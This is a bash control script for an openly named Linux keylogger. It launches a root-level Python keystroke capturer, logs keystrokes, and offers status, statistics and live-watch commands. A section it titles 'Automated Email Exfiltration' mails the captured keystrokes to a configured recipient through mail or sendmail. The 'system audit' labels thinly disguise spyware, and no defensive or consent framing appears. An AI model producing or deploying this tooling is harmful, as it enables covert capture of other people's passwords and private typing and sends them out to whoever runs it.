#!/bin/bash

# ============================================
# Linux Keylogger Project
# A comprehensive bash wrapper for the keylogger
# ============================================

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="${SCRIPT_DIR}/keystroke_audit.log"
PID_FILE="${SCRIPT_DIR}/keylogger.pid"
PYTHON_SCRIPT="${SCRIPT_DIR}/keylogger.py"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# ============================================
# Helper Functions
# ============================================

print_banner() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║                    LINUX KEYLOGGER                             ║"
    echo "║                    System Audit Tool                          ║"
    echo "║                    v1.0.0                                     ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_header() {
    echo -e "\n${BLUE}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}  $1${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
}

print_success() {
    echo -e "${GREEN}✓ $1${NC}"
}

print_error() {
    echo -e "${RED}✗ $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}⚠ $1${NC}"
}

print_info() {
    echo -e "${BLUE}ℹ $1${NC}"
}

# ============================================
# Phase 1: Input Device Identification & Privileges
# ============================================

check_privileges() {
    print_header "Phase 1: Privilege Check"
    if [ "$EUID" -ne 0 ]; then
        print_error "This script requires root privileges!"
        print_info "Please run with: sudo ./keylogger.sh"
        exit 1
    fi
    print_success "Running as root (UID: $EUID)"
    return 0
}

# ============================================
# Phase 2: Real-time Event Capture & Logging
# ============================================

start_keylogger() {
    print_header "Phase 2: Starting Keylogger"
    
    # Check if already running
    if [ -f "$PID_FILE" ]; then
        local pid=$(cat "$PID_FILE")
        if kill -0 "$pid" 2>/dev/null; then
            print_warning "Keylogger is already running with PID: $pid"
            return 1
        else
            rm -f "$PID_FILE"
        fi
    fi
    
    # Check if Python script exists
    if [ ! -f "$PYTHON_SCRIPT" ]; then
        print_error "Python script not found: $PYTHON_SCRIPT"
        return 1
    fi
    
    # Start the keylogger
    print_info "Starting keylogger..."
    sudo python3 "$PYTHON_SCRIPT" &
    local pid=$!
    
    # Save PID
    echo "$pid" > "$PID_FILE"
    print_success "Keylogger started with PID: $pid"
    print_info "Log file: $LOG_FILE"
    print_info "To stop: ./keylogger.sh stop"
    print_info "To view: ./keylogger.sh show"
    
    # Wait a moment and check if it's running
    sleep 2
    if kill -0 "$pid" 2>/dev/null; then
        print_success "Keylogger is running successfully"
        return 0
    else
        print_error "Keylogger failed to start"
        rm -f "$PID_FILE"
        return 1
    fi
}

stop_keylogger() {
    print_header "Stopping Keylogger"
    
    if [ -f "$PID_FILE" ]; then
        local pid=$(cat "$PID_FILE")
        if kill -0 "$pid" 2>/dev/null; then
            print_info "Stopping keylogger (PID: $pid)..."
            kill -TERM "$pid"
            sleep 2
            if kill -0 "$pid" 2>/dev/null; then
                kill -9 "$pid"
            fi
            rm -f "$PID_FILE"
            print_success "Keylogger stopped"
        else
            print_warning "Keylogger not running (stale PID file)"
            rm -f "$PID_FILE"
        fi
    else
        print_warning "Keylogger is not running"
    fi
}

# ============================================
# Phase 3: Automated Email Exfiltration
# ============================================

send_email_report() {
    print_header "Phase 3: Sending Email Report"
    
    if [ ! -f "$LOG_FILE" ]; then
        print_error "Log file not found: $LOG_FILE"
        return 1
    fi
    
    if [ ! -s "$LOG_FILE" ]; then
        print_warning "Log file is empty, skipping email"
        return 1
    fi
    
    # Get email configuration from Python script
    local recipient=$(grep "EMAIL_RECIPIENT" "$PYTHON_SCRIPT" | head -1 | cut -d'"' -f2)
    
    if [ -z "$recipient" ] || [ "$recipient" = "your_email@gmail.com" ]; then
        print_warning "Email not configured. Please edit keylogger.py"
        print_info "Set EMAIL_RECIPIENT and EMAIL_SENDER"
        return 1
    fi
    
    print_info "Sending to: $recipient"
    
    # Create email content
    local email_body="=== Keylogger Report ===\n"
    email_body+="Date: $(date)\n"
    email_body+="Log File: $LOG_FILE\n"
    email_body+="Size: $(du -h "$LOG_FILE" | cut -f1)\n"
    email_body+="Keys: $(wc -l < "$LOG_FILE")\n\n"
    email_body+="--- Log Content ---\n"
    email_body+="$(tail -100 "$LOG_FILE")"
    
    # Try sending with mail command
    if command -v mail &> /dev/null; then
        echo -e "$email_body" | mail -s "Keystroke Audit Log - $(date)" "$recipient"
        if [ $? -eq 0 ]; then
            print_success "Email sent successfully via mail command"
            return 0
        fi
    fi
    
    # Try with sendmail
    if command -v sendmail &> /dev/null; then
        {
            echo "To: $recipient"
            echo "Subject: Keystroke Audit Log - $(date)"
            echo "Content-Type: text/plain; charset=utf-8"
            echo ""
            echo -e "$email_body"
        } | sendmail -t
        if [ $? -eq 0 ]; then
            print_success "Email sent successfully via sendmail"
            return 0
        fi
    fi
    
    print_error "No email sending utility found (mail/sendmail)"
    print_info "Install mailutils: sudo apt-get install mailutils"
    return 1
}

# ============================================
# Utility Functions
# ============================================

show_status() {
    print_header "Keylogger Status"
    
    if [ -f "$PID_FILE" ]; then
        local pid=$(cat "$PID_FILE")
        if kill -0 "$pid" 2>/dev/null; then
            print_success "Keylogger is running"
            print_info "  PID: $pid"
            print_info "  Started: $(ps -p $pid -o lstart=)"
            print_info "  CPU: $(ps -p $pid -o %cpu=)%"
            print_info "  Memory: $(ps -p $pid -o %mem=)%"
            print_info "  Log: $LOG_FILE"
            
            if [ -f "$LOG_FILE" ]; then
                local size=$(du -h "$LOG_FILE" | cut -f1)
                local lines=$(wc -l < "$LOG_FILE")
                print_info "  Log size: $size ($lines lines)"
                print_info "  Last entry: $(tail -1 "$LOG_FILE" 2>/dev/null || echo 'None')"
            fi
        else
            print_warning "Keylogger not running (stale PID file)"
            rm -f "$PID_FILE"
        fi
    else
        print_warning "Keylogger is not running"
    fi
}

show_log() {
    print_header "Log Content"
    
    if [ -f "$LOG_FILE" ]; then
        if [ -s "$LOG_FILE" ]; then
            echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
            cat "$LOG_FILE"
            echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
            echo ""
            print_info "Total lines: $(wc -l < "$LOG_FILE")"
            print_info "File size: $(du -h "$LOG_FILE" | cut -f1)"
        else
            print_warning "Log file is empty"
        fi
    else
        print_error "Log file not found: $LOG_FILE"
    fi
}

show_statistics() {
    print_header "Log Statistics"
    
    if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
        local total_lines=$(wc -l < "$LOG_FILE")
        local key_events=$(grep -c "\[.*\]" "$LOG_FILE" 2>/dev/null || echo "0")
        local unique_keys=$(grep -o "\[.*\]" "$LOG_FILE" 2>/dev/null | sort -u | wc -l)
        local file_size=$(du -h "$LOG_FILE" | cut -f1)
        local last_entry=$(tail -1 "$LOG_FILE" 2>/dev/null || echo "None")
        
        echo -e "${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${BLUE}│${NC}  Statistics for: $LOG_FILE"
        echo -e "${BLUE}├──────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${BLUE}│${NC}  Total Lines     : $total_lines"
        echo -e "${BLUE}│${NC}  Key Events      : $key_events"
        echo -e "${BLUE}│${NC}  Unique Keys     : $unique_keys"
        echo -e "${BLUE}│${NC}  File Size       : $file_size"
        echo -e "${BLUE}│${NC}  Last Entry      : ${last_entry:0:50}..."
        echo -e "${BLUE}└──────────────────────────────────────────────────────────────┘${NC}"
        
        # Show key frequency
        echo ""
        print_info "Key Frequency (Top 10)"
        echo -e "${BLUE}────────────────────────────────────────────────────────────────${NC}"
        grep -o "\[.*\]" "$LOG_FILE" 2>/dev/null | sort | uniq -c | sort -rn | head -10 | while read count key; do
            printf "  %-15s : %s\n" "$key" "$count"
        done
    else
        print_warning "No log data available"
    fi
}

watch_log() {
    print_header "Live Log Monitoring"
    print_info "Press Ctrl+C to stop monitoring"
    echo ""
    
    if [ -f "$LOG_FILE" ]; then
        tail -f "$LOG_FILE" | while read line; do
            if [[ "$line" == *"[ENTER]"* ]]; then
                echo -e "${GREEN}$line${NC}"
            elif [[ "$line" == *"[BACKSPACE]"* ]]; then
                echo -e "${RED}$line${NC}"
            elif [[ "$line" == *"[SPACE]"* ]]; then
                echo -e "${BLUE}$line${NC}"
            else
                echo "$line"
            fi
        done
    else
        print_error "Log file not found"
    fi
}

clear_log() {
    print_header "Clearing Log"
    
    if [ -f "$LOG_FILE" ]; then
        print_warning "This will permanently delete the log file!"
        read -p "Are you sure? (y/N): " confirm
        if [[ "$confirm" =~ ^[Yy]$ ]]; then
            rm -f "$LOG_FILE"
            print_success "Log file cleared"
        else
            print_info "Operation cancelled"
        fi
    else
        print_warning "Log file does not exist"
    fi
}

# ============================================
# Help and Usage
# ============================================

show_help() {
    print_banner
    echo -e "${CYAN}USAGE:${NC}"
    echo "  ./keylogger.sh [COMMAND]"
    echo ""
    echo -e "${CYAN}COMMANDS:${NC}"
    echo "  start     - Start the keylogger"
    echo "  stop      - Stop the keylogger"
    echo "  status    - Show keylogger status"
    echo "  show      - Display log file content"
    echo "  stats     - Show log statistics"
    echo "  watch     - Live monitor the log file"
    echo "  send      - Manually send email report"
    echo "  clear     - Clear the log file"
    echo "  help      - Show this help message"
    echo ""
    echo -e "${CYAN}EXAMPLES:${NC}"
    echo "  sudo ./keylogger.sh start      # Start logging"
    echo "  sudo ./keylogger.sh status     # Check status"
    echo "  sudo ./keylogger.sh watch      # Monitor live"
    echo "  ./keylogger.sh show            # View log"
    echo ""
    echo -e "${CYAN}REQUIREMENTS:${NC}"
    echo "  - Python 3.6+ with evdev module"
    echo "  - Root privileges for hardware access"
    echo "  - mailutils for email sending (optional)"
    echo ""
    echo -e "${CYAN}CONFIGURATION:${NC}"
    echo "  Edit keylogger.py to set email settings:"
    echo "    EMAIL_RECIPIENT = 'your_email@gmail.com'"
    echo "    EMAIL_SENDER = 'your_email@gmail.com'"
    echo "    SMTP_PASSWORD = 'your_app_password'"
}

# ============================================
# Interactive Menu
# ============================================

interactive_menu() {
    print_banner
    echo -e "${CYAN}Interactive Menu${NC}"
    echo ""
    echo "  [1] Start Keylogger"
    echo "  [2] Stop Keylogger"
    echo "  [3] Show Status"
    echo "  [4] View Log"
    echo "  [5] Show Statistics"
    echo "  [6] Watch Log (Live)"
    echo "  [7] Send Email Report"
    echo "  [8] Clear Log"
    echo "  [9] Show Help"
    echo "  [0] Exit"
    echo ""
    read -p "Enter choice (0-9): " choice
    
    case "$choice" in
        1) check_privileges && start_keylogger ;;
        2) stop_keylogger ;;
        3) show_status ;;
        4) show_log ;;
        5) show_statistics ;;
        6) watch_log ;;
        7) send_email_report ;;
        8) clear_log ;;
        9) show_help ;;
        0) echo "Exiting."; exit 0 ;;
        *) print_error "Invalid choice!" ;;
    esac
}

# ============================================
# Main Script Execution
# ============================================

# Check if running as root for certain commands
case "$1" in
    start|stop|status|send)
        # These commands need root privileges
        if [ "$EUID" -ne 0 ]; then
            print_error "This command requires root privileges!"
            echo "Try: sudo ./keylogger.sh $1"
            exit 1
        fi
        ;;
    show|stats|watch|clear|help)
        # These commands can run without root
        ;;
    *)
        # Interactive mode
        interactive_menu
        exit 0
        ;;
esac

# Execute command
case "$1" in
    start)
        start_keylogger
        ;;
    stop)
        stop_keylogger
        ;;
    status)
        show_status
        ;;
    show)
        show_log
        ;;
    stats)
        show_statistics
        ;;
    watch)
        watch_log
        ;;
    send)
        send_email_report
        ;;
    clear)
        clear_log
        ;;
    help|--help|-h)
        show_help
        ;;
    *)
        if [ -n "$1" ]; then
            print_error "Unknown command: $1"
            echo "Use './keylogger.sh help' for usage"
        else
            interactive_menu
        fi
        ;;
esac

exit 0
